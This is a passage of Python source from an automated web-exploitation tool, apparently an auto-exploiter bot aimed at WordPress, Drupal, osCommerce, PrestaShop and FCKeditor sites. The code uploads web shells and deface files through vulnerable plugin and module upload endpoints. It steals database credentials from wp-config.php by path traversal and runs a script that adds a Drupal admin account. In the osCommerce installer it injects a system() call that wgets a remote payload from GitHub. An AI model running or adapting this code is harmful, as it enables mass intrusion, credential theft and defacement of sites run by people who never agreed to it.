                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/centum/revslider/temp/update_extract/br4in.gif' + '\n')
                    self.Revslider_Config(site)
                else:
                    self.Revslider_Config(site)
            elif '/wp-content/themes/beach_apollo/' in CheckRevslider.text.encode('utf-8'):
                requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
                CheckRev7 = requests.get('http://' + site +
                                         '/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/br4in.gif', timeout=5)
                if 'GIF89a' in CheckRev7.text.encode('utf-8'):
                    ShellCheck = requests.get('http://' + site +
                                              '/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/payload3.php', timeout=5)
                    if 'Vuln!!' in ShellCheck.text.encode('utf-8'):
                        self.Print_vuln_Shell(
                            site + '/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/payload3.php')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(
                                site + '/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/payload3.php' + '\n')
                    self.Print_Vuln_index(
                        site + '/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/br4in.gif')
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/br4in.gif' + '\n')
                    self.Revslider_Config(site)
                else:
                    self.Revslider_Config(site)
            elif '/wp-content/themes/cuckootap/' in CheckRevslider.text.encode('utf-8'):
                requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
                CheckRev8 = requests.get('http://' + site +
                                         '/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/br4in.gif', timeout=5)
                if 'GIF89a' in CheckRev8.text.encode('utf-8'):
                    ShellCheck = requests.get('http://' + site +
                                              '/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/payload3.php', timeout=5)
                    if 'Vuln!!' in ShellCheck.text.encode('utf-8'):
                        self.Print_vuln_Shell(
                            site + '/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/payload3.php')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(
                                site + '/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/payload3.php' + '\n')
                    self.Print_Vuln_index(
                        site + '/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/br4in.gif')
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/br4in.gif' + '\n')
                    self.Revslider_Config(site)
                else:
                    self.Revslider_Config(site)
            elif '/wp-content/themes/pindol/' in CheckRevslider.text.encode('utf-8'):
                requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
                CheckRev9 = requests.get('http://' + site +
                                         '/wp-content/themes/pindol/revslider/temp/update_extract/br4in.gif', timeout=5)
                if 'GIF89a' in CheckRev9.text.encode('utf-8'):
                    ShellCheck = requests.get('http://' + site +
                                              '/wp-content/themes/pindol/revslider/temp/update_extract/payload3.php', timeout=5)
                    if 'Vuln!!' in ShellCheck.text.encode('utf-8'):
                        self.Print_vuln_Shell(
                            site + '/wp-content/themes/pindol/revslider/temp/update_extract/payload3.php')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(
                                site + '/wp-content/themes/pindol/revslider/temp/update_extract/payload3.php' + '\n')
                    self.Print_Vuln_index(site + '/wp-content/themes/pindol/revslider/temp/update_extract/br4in.gif')
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/pindol/revslider/temp/update_extract/br4in.gif' + '\n')
                    self.Revslider_Config(site)
                else:
                    self.Revslider_Config(site)
            elif '/wp-content/themes/designplus/' in CheckRevslider.text.encode('utf-8'):
                requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
                CheckRev10 = requests.get('http://' + site +
                                          '/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/br4in.gif', timeout=5)
                if 'GIF89a' in CheckRev10.text.encode('utf-8'):
                    ShellCheck = requests.get('http://' + site +
                                              '/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/payload3.php', timeout=5)
                    if 'Vuln!!' in ShellCheck.text.encode('utf-8'):
                        self.Print_vuln_Shell(
                            site + '/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/payload3.php')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(
                                site + '/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/payload3.php' + '\n')
                    self.Print_Vuln_index(
                        site + '/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/br4in.gif')
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/br4in.gif' + '\n')
                    self.Revslider_Config(site)
                else:
                    self.Revslider_Config(site)
            elif '/wp-content/themes/rarebird/' in CheckRevslider.text.encode('utf-8'):
                requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
                CheckRev11 = requests.get('http://' + site +
                                          '/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/br4in.gif', timeout=5)
                if 'GIF89a' in CheckRev11.text.encode('utf-8'):
                    ShellCheck = requests.get('http://' + site +
                                              '/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/payload3.php', timeout=5)
                    if 'Vuln!!' in ShellCheck.text.encode('utf-8'):
                        self.Print_vuln_Shell(
                            site + '/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/payload3.php')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(
                                site + '/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/payload3.php' + '\n')
                    self.Print_Vuln_index(
                        site + '/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/br4in.gif')
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/br4in.gif' + '\n')
                    self.Revslider_Config(site)

                else:
                    self.Revslider_Config(site)
            elif '/wp-content/themes/Avada/' in CheckRevslider.text.encode('utf-8'):
                requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
                CheckRev12 = requests.get('http://' + site +
                                          '/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/br4in.gif', timeout=5)
                if 'GIF89a' in CheckRev12.text.encode('utf-8'):
                    ShellCheck = requests.get('http://' + site +
                                              '/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/payload3.php', timeout=5)
                    if 'Vuln!!' in ShellCheck.text.encode('utf-8'):
                        self.Print_vuln_Shell(
                            site + '/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/payload3.php')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(
                                site + '/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/payload3.php' + '\n')
                    self.Print_Vuln_index(
                        site + '/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/br4in.gif')
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/br4in.gif' + '\n')
                    self.Revslider_Config(site)
                else:
                    self.Revslider_Config(site)
            else:
                self.Print_NotVuln('revslider', site)
        except:
            self.Print_NotVuln('revslider', site)

    def Revslider_Config(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php'
            GetConfig = requests.get(Exp, timeout=5)
            if 'DB_PASSWORD' in GetConfig.text.encode('utf-8'):
                self.Print_vuln_Config(site)
                with open('result/Config_results.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text.encode('utf-8'))
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text.encode('utf-8'))
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text.encode('utf-8'))
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text.encode('utf-8'))
                    with open('result/Config_results.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                    self.Revslider_css(site)
                except:
                    self.Revslider_css(site)
            else:
                self.Revslider_css(site)
        except:
            self.Revslider_css(site)

    def viral_optins(self, site):
        try:
            defaceFile = {
                'Filedata': ('vuln.txt', open(self.TextindeX, 'rb'), 'text/html')
            }
            x = requests.post('http://' + site + '/wp-content/plugins/viral-optins/api/uploader/file-uploader.php',
                              files=defaceFile, timeout=5)
            if 'id="wpvimgres"' in x.text.encode('utf-8'):
                uploader = site + '/wp-content/uploads/20' + self.year + '/' + self.month + '/vuln.txt'
                GoT = requests.get('http://' + uploader, timeout=5)
                find = re.findall('<img src="http://(.*)" height="', x.text.encode('utf-8'))
                GoT2 = requests.get('http://' + find[0], timeout=5)
                print find[0]
                if 'Vuln!!' in GoT.text.encode('utf-8'):
                    self.Print_Vuln_index(site + '/wp-content/uploads/20' + self.year + '/' + self.month + '/vuln.txt')
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/wp-content/uploads/20' + self.year + '/' + self.month + '/vuln.txt' + '\n')
                elif 'Vuln!!' in GoT2.text.encode('utf-8'):
                    self.Print_Vuln_index(find[0])
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + find[0] + '\n')
                else:
                    self.Print_NotVuln('viral optins', site)
            else:
                self.Print_NotVuln('viral optins', site)
        except:
            self.Print_NotVuln('viral optins', site)


    def Woocomrece(self, site):
        try:
            Exp = 'http://' + site + '/wp-admin/admin-ajax.php'
            Postdata = {'action': 'nm_personalizedproduct_upload_file', 'name': 'upload.php'}
            FileData = {'file': (self.pagelinesExploitShell.split('/')[1], open(self.pagelinesExploitShell, 'rb'),
                                 'multipart/form-data')}
            GoT = requests.post(Exp, files=FileData, data=Postdata, timeout=5)
            if GoT.status_code == 200 or 'success' in GoT.text.encode('utf-8'):
                UploadPostPath = 'http://' + site + '/wp-content/uploads/product_files/upload.php'
                CheckShell = requests.get(UploadPostPath, timeout=5)
                if 'Vuln!!' in CheckShell.text.encode('utf-8'):
                    shellChecker = requests.get('http://' + site + '/wp-content/payload3.php', timeout=5)
                    if 'Vuln!!' in shellChecker.text.encode('utf-8'):
                        self.Print_vuln_Shell(site + '/wp-content/payload3.php')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(site + '/wp-content/payload3.php' + '\n')
                    IndexCheck = requests.get('http://' + site + '/br4in.htm', timeout=5)
                    if 'Vuln!!' in IndexCheck.text.encode('utf-8'):
                        self.Print_Vuln_index(site + '/br4in.htm')
                        with open('result/Index_results.txt', 'a') as writer:
                            writer.write(site + '/br4in.htm' + '\n')
                    else:
                        self.Print_NotVuln('Woocomrece', site)
                else:
                    self.Print_NotVuln('Woocomrece', site)
            else:
                self.Print_NotVuln('Woocomrece', site)
        except:
            self.Print_NotVuln('Woocomrece', site)


    def FckPath(self, zzz):
        try:
            find = re.findall(',"(.*)","', zzz)
            path = find[0].strip()
            return path
        except:
            pass

    def FckEditor(self, site):
        try:
            exp2 = '/fckeditor/editor/filemanager/connectors/php/upload.php?Type=Media'
            try:
                CheckVuln = requests.get('http://' + site + exp2, timeout=5)
                if 'OnUploadCompleted(202' in CheckVuln.text.encode('utf-8'):
                    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0',
                               'Accept': '*/*'}
                    exp = 'http://' + site + exp2
                    po = {'Content_Type': 'form-data'}
                    fil = {'NewFile': open(self.Jce_Deface_image, 'rb')}
                    rr = requests.post(exp, data=po, headers=headers, timeout=10, files=fil)
                    if '.gif' in rr.text.encode('utf-8'):
                        zart = self.FckPath(rr.text.encode('utf-8'))
                        x = 'http://' + site + str(zart)
                        wcheck2 = requests.get(x, timeout=5)
                        if wcheck2.status_code == 200:
                            check_deface = requests.get(x, timeout=10)
                            if 'GIF89a' in check_deface.text.encode('utf-8'):
                                self.Print_Vuln_index(site + str(zart))
                                with open('result/Index_results.txt', 'a') as writer:
                                    writer.write(site + str(zart) + '\n')
                            else:
                                self.Print_NotVuln('fckeditor', site)
                        else:
                            self.Print_NotVuln('fckeditor', site)
                    else:
                        self.Print_NotVuln('fckeditor', site)
                else:
                    self.Print_NotVuln('fckeditor', site)
            except:
                self.Print_NotVuln('fckeditor', site)
        except:
            self.Print_NotVuln('fckeditor', site)

    def Drupal_Sqli_Addadmin(self, site):
        os.system('python files/adminTakeoverdupal.py -t http://' + site + ' -u pwndrupal -p pwndrupal')

    def osCommerce(self, site):
        try:
            CheckVuln = requests.get('http://' + site + '/install/index.php', timeout=5)
            if 'Welcome to osCommerce' in CheckVuln.text.encode('utf-8') or CheckVuln.status_code == 200:
                Exp = site + '/install/install.php?step=4'
                data = {
                    'DIR_FS_DOCUMENT_ROOT': './'
                }
                shell = '\');'
                shell += 'system("wget https://raw.githubusercontent.com/04x/ICG-AutoExploiterBoT/master/files/OsComPayLoad.php");'
                shell += '/*'
                deface = '\');'
                deface += 'system("echo Vuln!! patch it Now!> ../../br4in.htm");'
                deface += '/*'
                data['DB_DATABASE'] = deface
                r = requests.post(url='http://' + Exp, data=data, timeout=5)
                if r.status_code == 200:
                    requests.get('http://' + site + '/install/includes/configure.php', timeout=5)
                    CheckIndex = requests.get('http://' + site + '/br4in.htm', timeout=5)
                    if 'Vuln!!' in CheckIndex.text.encode('utf-8'):
                        self.Print_Vuln_index(site + '/br4in.htm')
                        with open('result/Index_results.txt', 'a') as writer:
                            writer.write(site + '/vuln.txt' + '\n')
                        try:
                            data['DB_DATABASE'] = shell
                            requests.post(url='http://' + Exp, data=data, timeout=5)
                            requests.get('http://' + site + '/install/includes/configure.php', timeout=5)
                            requests.get('http://' + site + '/install/includes/OsComPayLoad.php', timeout=5)
                            Checkshell = requests.get('http://' + site + '/install/includes/payload3.php', timeout=5)
                            if 'Vuln!!' in Checkshell.text.encode('utf-8'):
                                self.Print_vuln_Shell(site + '/wp-content/payload3.php')
                                with open('result/Shell_results.txt', 'a') as writer:
                                    writer.write(site + '/wp-content/payload3.php' + '\n')
                        except:
                            pass
                    else:
                        self.Print_NotVuln('osCommerce RCE', site)
                else:
                    self.Print_NotVuln('osCommerce RCE', site)
            else:
                self.Print_NotVuln('osCommerce RCE', site)
        except:
            self.Print_NotVuln('osCommerce RCE', site)

    def columnadverts(self, site):
        try:
            Exp = site + '/modules/columnadverts/uploadimage.php'
            FileDataIndex = {'userfile': open(self.Jce_Deface_image, 'rb')}
            FileDataShell = {'userfile': open(self.ShellPresta, 'rb')}
            GoT = requests.post('http://' + Exp, files=FileDataIndex, timeout=5)
            if 'success' in GoT.text.encode('utf-8'):
                IndexPath = '/modules/columnadverts/slides/' + self.Jce_Deface_image.split('/')[1]
                CheckIndex = requests.get('http://' + site + IndexPath, timeout=5)
                if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                    self.Print_Vuln_index(IndexPath)
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(IndexPath + '\n')
                    requests.post('http://' + Exp, files=FileDataShell, timeout=5)
                    ShellPath = '/modules/columnadverts/slides/' + self.ShellPresta.split('/')[1]
                    CheckShell = requests.get('http://' + site + ShellPath, timeout=5)
                    if 'Vuln!!' in CheckShell.text.encode('utf-8'):
                        self.Print_vuln_Shell(site + ShellPath)
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(site + ShellPath + '\n')
                else:
                    self.Print_NotVuln('columnadverts', site)
            else:
                self.Print_NotVuln('columnadverts', site)
        except:
            self.Print_NotVuln('columnadverts', site)

    def soopamobile(self, site):
        try:
            Exp = site + '/modules/soopamobile/uploadimage.php'
            FileDataIndex = {'userfile': open(self.Jce_Deface_image, 'rb')}
            FileDataShell = {'userfile': open(self.ShellPresta, 'rb')}
            GoT = requests.post('http://' + Exp, files=FileDataIndex, timeout=5)
            if 'success' in GoT.text.encode('utf-8'):
                IndexPath = '/modules/soopamobile/slides/' + self.Jce_Deface_image.split('/')[1]
                CheckIndex = requests.get('http://' + site + IndexPath, timeout=5)
                if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                    self.Print_Vuln_index(IndexPath)
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(IndexPath + '\n')
                    requests.post('http://' + Exp, files=FileDataShell, timeout=5)
                    ShellPath = '/modules/soopamobile/slides/' + self.ShellPresta.split('/')[1]
                    CheckShell = requests.get('http://' + site + ShellPath, timeout=5)
                    if 'Vuln!!' in CheckShell.text.encode('utf-8'):
                        self.Print_vuln_Shell(ShellPath)
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(ShellPath + '\n')
                else:
                    self.Print_NotVuln('soopamobile', site)
            else:
                self.Print_NotVuln('soopamobile', site)
        except:
            self.Print_NotVuln('soopamobile', site)


    def soopabanners(self, site):
        try:
            Exp = site + '/modules/soopabanners/uploadimage.php'
            FileDataIndex = {'userfile': open(self.Jce_Deface_image, 'rb')}
            FileDataShell = {'userfile': open(self.ShellPresta, 'rb')}
            GoT = requests.post('http://' + Exp, files=FileDataIndex, timeout=5)
            if 'success' in GoT.text.encode('utf-8'):
                IndexPath = '/modules/soopabanners/slides/' + self.Jce_Deface_image.split('/')[1]
                CheckIndex = requests.get('http://' + site + IndexPath, timeout=5)
                if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                    self.Print_Vuln_index(IndexPath)
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(IndexPath + '\n')
                    requests.post('http://' + Exp, files=FileDataShell, timeout=5)
                    ShellPath = '/modules/soopabanners/slides/' + self.ShellPresta.split('/')[1]
                    CheckShell = requests.get('http://' + site + ShellPath, timeout=5)
                    if 'Vuln!!' in CheckShell.text.encode('utf-8'):
                        self.Print_vuln_Shell(ShellPath)
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(ShellPath + '\n')
                else:
                    self.Print_NotVuln('soopabanners', site)
            else:
                self.Print_NotVuln('soopabanners', site)
        except:
            self.Print_NotVuln('soopabanners', site)


    def vtermslideshow(self, site):
        try:
            Exp = site + '/modules/vtermslideshow/uploadimage.php'
            FileDataIndex = {'userfile': open(self.Jce_Deface_image, 'rb')}
            FileDataShell = {'userfile': open(self.ShellPresta, 'rb')}
            GoT = requests.post('http://' + Exp, files=FileDataIndex, timeout=5)
            if 'success' in GoT.text.encode('utf-8'):
                IndexPath = '/modules/vtermslideshow/slides/' + self.Jce_Deface_image.split('/')[1]
                CheckIndex = requests.get('http://' + site + IndexPath, timeout=5)
                if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                    self.Print_Vuln_index(IndexPath)
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(IndexPath + '\n')
                    requests.post('http://' + Exp, files=FileDataShell, timeout=5)
                    ShellPath = '/modules/vtermslideshow/slides/' + self.ShellPresta.split('/')[1]
                    CheckShell = requests.get('http://' + site + ShellPath, timeout=5)
                    if 'Vuln!!' in CheckShell.text.encode('utf-8'):
                        self.Print_vuln_Shell(ShellPath)
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(ShellPath + '\n')
                else:
                    self.Print_NotVuln('vtermslideshow', site)
            else:
                self.Print_NotVuln('vtermslideshow', site)
        except:
            self.Print_NotVuln('vtermslideshow', site)

    def simpleslideshow(self, site):
        try:
            Exp = site + '/modules/simpleslideshow/uploadimage.php'
            FileDataIndex = {'userfile': open(self.Jce_Deface_image, 'rb')}
            FileDataShell = {'userfile': open(self.ShellPresta, 'rb')}
            GoT = requests.post('http://' + Exp, files=FileDataIndex, timeout=5)
            if 'success' in GoT.text.encode('utf-8'):
                IndexPath = '/modules/simpleslideshow/slides/' + self.Jce_Deface_image.split('/')[1]
                CheckIndex = requests.get('http://' + site + IndexPath, timeout=5)
                if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                    self.Print_Vuln_index(IndexPath)
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(IndexPath + '\n')
                    requests.post('http://' + Exp, files=FileDataShell, timeout=5)
                    ShellPath = '/modules/simpleslideshow/slides/' + self.ShellPresta.split('/')[1]
                    CheckShell = requests.get('http://' + site + ShellPath, timeout=5)
                    if 'Vuln!!' in CheckShell.text.encode('utf-8'):
                        self.Print_vuln_Shell(ShellPath)
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(ShellPath + '\n')
                else:
                    self.Print_NotVuln('simpleslideshow', site)
            else:
                self.Print_NotVuln('simpleslideshow', site)
        except:
            self.Print_NotVuln('simpleslideshow', site)

    def productpageadverts(self, site):
        try:
            Exp = site + '/modules/productpageadverts/uploadimage.php'
            FileDataIndex = {'userfile': open(self.Jce_Deface_image, 'rb')}
            FileDataShell = {'userfile': open(self.ShellPresta, 'rb')}
            GoT = requests.post('http://' + Exp, files=FileDataIndex, timeout=5)
            if 'success' in GoT.text.encode('utf-8'):
                IndexPath = '/modules/productpageadverts/slides/' + self.Jce_Deface_image.split('/')[1]
                CheckIndex = requests.get('http://' + site + IndexPath, timeout=5)
                if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                    self.Print_Vuln_index(IndexPath)
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(IndexPath + '\n')
                    requests.post('http://' + Exp, files=FileDataShell, timeout=5)
                    ShellPath = '/modules/productpageadverts/slides/' + self.ShellPresta.split('/')[1]
                    CheckShell = requests.get('http://' + site + ShellPath, timeout=5)
                    if 'Vuln!!' in CheckShell.text.encode('utf-8'):
                        self.Print_vuln_Shell(ShellPath)
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(ShellPath + '\n')
                else:
                    self.Print_NotVuln('productpageadverts', site)
            else:
                self.Print_NotVuln('productpageadverts', site)
        except:
            self.Print_NotVuln('productpageadverts', site)

    def homepageadvertise(self, site):
        try:
            Exp = site + '/modules/homepageadvertise/uploadimage.php'
            FileDataIndex = {'userfile': open(self.Jce_Deface_image, 'rb')}
            FileDataShell = {'userfile': open(self.ShellPresta, 'rb')}
            GoT = requests.post('http://' + Exp, files=FileDataIndex, timeout=5)
            if 'success' in GoT.text.encode('utf-8'):
                IndexPath = '/modules/homepageadvertise/slides/' + self.Jce_Deface_image.split('/')[1]
                CheckIndex = requests.get('http://' + site + IndexPath, timeout=5)
                if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                    self.Print_Vuln_index(IndexPath)
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(IndexPath + '\n')
                    requests.post('http://' + Exp, files=FileDataShell, timeout=5)
                    ShellPath = '/modules/homepageadvertise/slides/' + self.ShellPresta.split('/')[1]
                    CheckShell = requests.get('http://' + site + ShellPath, timeout=5)
                    if 'Vuln!!' in CheckShell.text.encode('utf-8'):
                        self.Print_vuln_Shell(ShellPath)
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(ShellPath + '\n')
                else:
                    self.Print_NotVuln('homepageadvertise', site)
            else:
                self.Print_NotVuln('homepageadvertise', site)
        except:
            self.Print_NotVuln('homepageadvertise', site)

    def homepageadvertise2(self, site):
        try:
            Exp = site + '/modules/homepageadvertise2/uploadimage.php'
            FileDataIndex = {'userfile': open(self.Jce_Deface_image, 'rb')}
            FileDataShell = {'userfile': open(self.ShellPresta, 'rb')}
            GoT = requests.post('http://' + Exp, files=FileDataIndex, timeout=5)
            if 'success' in GoT.text.encode('utf-8'):
                IndexPath = '/modules/homepageadvertise2/slides/' + self.Jce_Deface_image.split('/')[1]
                CheckIndex = requests.get('http://' + site + IndexPath, timeout=5)
                if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                    self.Print_Vuln_index(IndexPath)
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(IndexPath + '\n')
                    requests.post('http://' + Exp, files=FileDataShell, timeout=5)
                    ShellPath = '/modules/homepageadvertise2/slides/' + self.ShellPresta.split('/')[1]
                    CheckShell = requests.get('http://' + site + ShellPath, timeout=5)
                    if 'Vuln!!' in CheckShell.text.encode('utf-8'):
                        self.Print_vuln_Shell(ShellPath)
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(ShellPath + '\n')
                else:
                    self.Print_NotVuln('homepageadvertise2', site)
            else:
                self.Print_NotVuln('homepageadvertise2', site)
        except:
            self.Print_NotVuln('homepageadvertise2', site)

    def jro_homepageadvertise(self, site):
        try:
            Exp = site + '/modules/jro_homepageadvertise/uploadimage.php'
            FileDataIndex = {'userfile': open(self.Jce_Deface_image, 'rb')}
            FileDataShell = {'userfile': open(self.ShellPresta, 'rb')}
            GoT = requests.post('http://' + Exp, files=FileDataIndex, timeout=5)
            if 'success' in GoT.text.encode('utf-8'):
                IndexPath = '/modules/jro_homepageadvertise/slides/' + self.Jce_Deface_image.split('/')[1]
                CheckIndex = requests.get('http://' + site + IndexPath, timeout=5)
                if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                    self.Print_Vuln_index(IndexPath)
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(IndexPath + '\n')
                    requests.post('http://' + Exp, files=FileDataShell, timeout=5)
                    ShellPath = '/modules/jro_homepageadvertise/slides/' + self.ShellPresta.split('/')[1]
                    CheckShell = requests.get('http://' + site + ShellPath, timeout=5)
                    if 'Vuln!!' in CheckShell.text.encode('utf-8'):
                        self.Print_vuln_Shell(ShellPath)
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(ShellPath + '\n')
                else:
                    self.Print_NotVuln('jro_homepageadvertise', site)
            else:
                self.Print_NotVuln('jro_homepageadvertise', site)
        except:
            self.Print_NotVuln('jro_homepageadvertise', site)

    def attributewizardpro(self, site):
        try:
            Exp = site + '/modules/attributewizardpro/file_upload.php'
            FileDataIndex = {'userfile': open(self.Jce_Deface_image, 'rb')}
            FileDataShell = {'userfile': open(self.ShellPresta, 'rb')}
            GoT = requests.post('http://' + Exp, files=FileDataIndex, timeout=5)
            if self.Jce_Deface_image.split('/')[1] in GoT.text.encode('utf-8'):
                Index = GoT.text.encode('utf-8').split('|||')[0]
                print Index
                IndexPath = site + '/modules/attributewizardpro/file_uploads/' + Index
                CheckIndex = requests.get('http://' + IndexPath, timeout=5)
                if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                    self.Print_Vuln_index(IndexPath)
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(IndexPath + '\n')
                    Got2 = requests.post('http://' + Exp, files=FileDataShell, timeout=5)
                    if self.ShellPresta.split('/')[1] in GoT.text.encode('utf-8'):
                        Shell = Got2.text.encode('utf-8').split('|||')[0]
                        ShellPath = site + '/modules/attributewizardpro/file_uploads/' + Shell
                        CheckShell = requests.get('http://' + ShellPath, timeout=5)
                        if 'Vuln!!' in CheckShell.text.encode('utf-8'):
                            self.Print_vuln_Shell(ShellPath)
                            with open('result/Shell_results.txt', 'a') as writer:
                                writer.write(ShellPath + '\n')
                else:
                    self.Print_NotVuln('attributewizardpro', site)
            else:
                self.Print_NotVuln('attributewizardpro', site)
        except:
            self.Print_NotVuln('attributewizardpro', site)


    def attributewizardpro2(self, site):
        try:
            Exp = site + '/modules/1attributewizardpro/file_upload.php'
            FileDataIndex = {'userfile': open(self.Jce_Deface_image, 'rb')}
            FileDataShell = {'userfile': open(self.ShellPresta, 'rb')}
            GoT = requests.post('http://' + Exp, files=FileDataIndex, timeout=5)
            if self.Jce_Deface_image.split('/')[1] in GoT.text.encode('utf-8'):
                Index = GoT.text.encode('utf-8').split('|||')[0]
                print Index
                IndexPath = site + '/modules/1attributewizardpro/file_uploads/' + Index
                CheckIndex = requests.get('http://' + IndexPath, timeout=5)
                if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                    self.Print_Vuln_index(IndexPath)
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(IndexPath + '\n')
                    Got2 = requests.post('http://' + Exp, files=FileDataShell, timeout=5)
                    if self.ShellPresta.split('/')[1] in GoT.text.encode('utf-8'):
                        Shell = Got2.text.encode('utf-8').split('|||')[0]
                        ShellPath = site + '/modules/1attributewizardpro/file_uploads/' + Shell
                        CheckShell = requests.get('http://' + ShellPath, timeout=5)
                        if 'Vuln!!' in CheckShell.text.encode('utf-8'):
                            self.Print_vuln_Shell(ShellPath)
                            with open('result/Shell_results.txt', 'a') as writer:
                                writer.write(ShellPath + '\n')
                else:
                    self.Print_NotVuln('1attributewizardpro', site)
            else:
                self.Print_NotVuln('1attributewizardpro', site)
        except:
            self.Print_NotVuln('1attributewizardpro', site)

    def attributewizardpro3(self, site):
        try:
            Exp = site + '/modules/attributewizardpro.OLD/file_upload.php'
            FileDataIndex = {'userfile': open(self.Jce_Deface_image, 'rb')}
            FileDataShell = {'userfile': open(self.ShellPresta, 'rb')}
            GoT = requests.post('http://' + Exp, files=FileDataIndex, timeout=5)
            if self.Jce_Deface_image.split('/')[1] in GoT.text.encode('utf-8'):
                Index = GoT.text.encode('utf-8').split('|||')[0]
                print Index
                IndexPath = site + '/modules/attributewizardpro.OLD/file_uploads/' + Index
                CheckIndex = requests.get('http://' + IndexPath, timeout=5)
                if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                    self.Print_Vuln_index(IndexPath)
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(IndexPath + '\n')
                    Got2 = requests.post('http://' + Exp, files=FileDataShell, timeout=5)
                    if self.ShellPresta.split('/')[1] in GoT.text.encode('utf-8'):
                        Shell = Got2.text.encode('utf-8').split('|||')[0]
                        ShellPath = site + '/modules/attributewizardpro.OLD/file_uploads/' + Shell
